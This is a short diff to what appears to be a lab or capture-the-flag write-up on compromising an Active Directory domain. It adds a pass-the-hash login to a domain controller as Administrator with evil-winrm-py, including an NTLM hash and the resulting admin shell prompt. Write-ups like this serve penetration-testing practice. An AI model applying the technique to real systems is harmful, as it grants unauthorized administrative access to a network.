@@ -759,5 +759,19 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 Then ill auth and get a TGT and get a hash
 
 ```python
+❯❯❯ evil-winrm-py -i dc01.orion.local -u Administrator -H '54c9fa5ad8849c9414602fe021314d49'
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.6.0
+
+[*] Connecting to 'dc01.orion.local:5985' as 'Administrator'
+evil-winrm-py PS C:\Users\Administrator\Documents>
+```
+
+Then i can log in as the admin
+
+```python
 
 ```
